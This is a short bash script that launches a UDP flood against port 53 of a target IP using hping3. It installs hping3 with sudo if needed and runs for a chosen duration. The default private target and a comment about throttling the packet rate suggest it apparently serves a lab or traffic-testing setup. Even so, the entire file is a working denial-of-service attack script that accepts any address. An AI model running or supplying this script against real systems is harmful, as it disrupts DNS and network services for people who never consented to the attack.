#!/bin/bash
# attack_udp_flood.sh
# UDP flood attack on port 53 using hping3
# Usage: ./attack_udp_flood.sh <target_ip> [duration_seconds]

TARGET_IP="${1:-192.168.64.2}"
DURATION="${2:-10}"

echo "=========================================="
echo "Starting UDP Flood Attack"
echo "Target: $TARGET_IP:53"
echo "Duration: ${DURATION} seconds"
echo "=========================================="

if ! command -v hping3 &> /dev/null; then
    echo "hping3 not found. Installing..."
    sudo apt-get update
    sudo apt-get install -y hping3
fi

echo "[*] Flooding port 53 with UDP packets for ${DURATION} seconds..."
# Use -i u10000 instead of --flood to avoid overwhelming the target
sudo hping3 -2 -i u10000 -p 53 $TARGET_IP &
HPING_PID=$!

sleep $DURATION

echo "[*] Stopping UDP flood..."
sudo kill -9 $HPING_PID 2>/dev/null

echo "[*] UDP flood completed at $(date)"
